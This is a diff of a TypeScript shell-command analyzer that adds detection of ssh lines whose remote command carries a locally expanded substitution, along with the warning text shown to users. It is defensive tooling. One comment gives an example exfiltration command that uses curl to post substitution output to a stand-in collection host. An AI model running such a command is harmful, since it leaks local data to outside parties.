@@ -696,8 +696,10 @@ export function findOpenWorldHostLiteralsInArgv(argv: readonly string[]): string
  * **Two rules govern every sentence below, and both are load-bearing:**
  *
  * 1. **It never invents a flow.** An arm fires only where its mechanism is true of the program
- *    named — the at-sign convention only for a program that has it, a substitution only where the
- *    program SENDS that operand, execution of fetched bytes only where **no token on the
+ *    named — the at-sign convention only for a program that has it AND only in a position that
+ *    program reads a file from, a substitution only where the program SENDS that operand, remote
+ *    execution only where the argv shape settles which operand is the destination
+ *    ({@link REMOTE_COMMAND_HEADS}), execution of fetched bytes only where **no token on the
  *    interpreter's own argv could be a program**. That last one is read from ARGV SHAPE alone,
  *    without knowing what any flag letter means, so it hedges wherever a token has text of its own
  *    that could be a program — and where two shapes are indistinguishable by their characters it
@@ -1003,6 +1005,21 @@ export type ComposedFlow =
       readonly transfer: string;
       readonly hosts: readonly string[];
       readonly path: string | null;
+    }
+  /**
+   * An operand after an ssh destination is a command the REMOTE host runs, and it carries a
+   * substitution the local shell expands before ssh is started.
+   *
+   * `destination` is separate from `hosts` because the claim this arm makes is about ONE host — the
+   * one the remote command runs on. A second host inside that remote command (`ssh host curl -d
+   * "$(…)" https://collect.example/u`) is contacted by the REMOTE machine, not by this one, and
+   * folding it into the same phrase would say ssh executes a command on it.
+   */
+  | {
+      readonly kind: 'remote-command';
+      readonly transfer: string;
+      readonly destination: string;
+      readonly hosts: readonly string[];
     };
 
 /** What the note path found in a command the parser could not resolve as a whole. */
@@ -1179,6 +1196,54 @@ function substitutionIsSent(segment: AnalyzedSegment): boolean {
   return false;
 }
 
+/**
+ * Heads whose operands AFTER the destination are a command line the REMOTE host runs.
+ *
+ * **ssh alone, and it is here because of one fact about ssh's grammar and nothing more.** ssh is
+ * `ssh [options] destination [command …]`: it has no positional operand before the destination, and
+ * every option it takes begins with a dash. So when the token immediately after `ssh` does NOT begin
+ * with a dash, that token IS the destination — unconditionally, with no table of which flags take a
+ * value — and everything after it is the command the remote machine runs.
+ *
+ * {@link remoteCommandOperands} therefore reads only that one shape and declines the rest. That is
+ * the whole of the claim, and it is deliberately smaller than "where is ssh's destination": with a
+ * flag present (`ssh -p 2222 deploy@host …`, `ssh -i key deploy@host …`) the destination's position
+ * depends on whether that flag consumes the next token, which is exactly the enumeration
+ * [[cmd-pos-is-an-enumeration]] says acquires a blind spot one release at a time. A declined shape
+ * costs the flowless sentence, which still names the host; a wrong one would assert that a token is
+ * executed on a remote machine when it is a local filename.
+ */
+const REMOTE_COMMAND_HEADS: ReadonlySet<string> = new Set(['ssh']);
+
+/**
+ * The destination and the remote command line of a part whose grammar this module can read — or
+ * `null` for every other part, including every ssh line carrying a flag.
+ *
+ * The destination must itself be a host literal this part found. A configured alias
+ * (`ssh myserver …`) names no counterparty, which is the same rule that keeps `git push origin main`
+ * and `npm install lodash` out of the floor, and there would be no host to attach the sentence to.
+ *
+ * **The two tests below OVERLAP on every input reachable today, and that is stated rather than
+ * claimed away.** Deleting the dash test alone changes no behaviour and kills no test, because
+ * {@link matchArgv} only ever admits a positional operand or the part of a token AFTER an `=`, so a
+ * token beginning with a dash is never in `segment.hosts` and the host test declines it anyway. It
+ * is kept because it is the one that states ssh's grammar — the host test reaches the same answer
+ * for a reason about our own extractor rather than about ssh, and a later widening there would
+ * silently make argv[1] a "destination" that ssh never treated as one. Mutating the destination to
+ * *"the first host literal anywhere in the part"* — the shape this guards against — does turn the
+ * spec red.
+ */
+function remoteCommandOperands(
+  segment: AnalyzedSegment
+): { readonly destination: string; readonly remote: readonly string[] } | null {
+  if (!REMOTE_COMMAND_HEADS.has(segment.head)) return null;
+  const destination = segment.argv[1];
+  if (destination === undefined || destination.startsWith('-')) return null;
+  if (!segment.hosts.includes(destination)) return null;
+  const remote = segment.argv.slice(2);
+  return remote.length === 0 ? null : { destination, remote };
+}
+
 /** Read one part the way the matcher reads a whole command; `null` when it does not tokenize. */
 function analyzeSegment(segment: CommandSegment): AnalyzedSegment | null {
   const argv = tokenize(segment.text);
@@ -1227,6 +1292,18 @@ function findFlow(segments: readonly AnalyzedSegment[]): ComposedFlow | null {
   }
   for (const segment of segments) {
     if (segment.hosts.length === 0) continue;
+    // Before the substitution arm, because it is the more specific reading of the same token: on an
+    // ssh line a substitution in the remote-command position is not merely SENT to the host, it is
+    // what the host RUNS, and the flowless arm used to be all this shape got.
+    const remote = remoteCommandOperands(segment);
+    if (remote !== null && remote.remote.some((token) => EXECUTING_SUBSTITUTION_RE.test(token))) {
+      return {
+        kind: 'remote-command',
+        transfer: segment.head,
+        destination: remote.destination,
+        hosts: segment.hosts,
+      };
+    }
     if (substitutionIsSent(segment)) {
       return {
         kind: 'substitution-into-transfer',
@@ -1397,6 +1474,29 @@ function flowSentence(flow: ComposedFlow): string {
         `An operand of ${transfer} begins with an at-sign, which tells ${transfer} to read ` +
         `${file} and send its CONTENTS to ${host} rather than sending the name itself. What is in ` +
         `that file?`
+      );
+    }
+    case 'remote-command': {
+      const transfer = quotable(flow.transfer) ?? 'the remote-shell program';
+      const destination = quotable(flow.destination) ?? 'that host';
+      // Every OTHER host of this part, named without a claim about it: those are contacted by the
+      // REMOTE machine if they are contacted at all, so the sentence above must not sweep them into
+      // "the command runs on" — see {@link ComposedFlow}'s `remote-command` arm.
+      const { phrase, plural } = nameHosts(
+        flow.hosts.filter((host) => host !== flow.destination),
+        ''
+      );
+      const alsoNames =
+        phrase === ''
+          ? ''
+          : ` That remote command also names ${phrase}, and the gate is not saying what reaches ` +
+            `${plural ? 'them' : 'it'}.`;
+      return (
+        `The operands after the destination are the command ${transfer} runs ON ${destination}, ` +
+        `not on this machine, and one of them is a substitution. The SHELL here expands that inner ` +
+        `command BEFORE ${transfer} starts, so what travels to ${destination} and executes there is ` +
+        `output produced on THIS machine, not the literal text shown. What does the inner command ` +
+        `produce?${alsoNames}`
       );
     }
   }
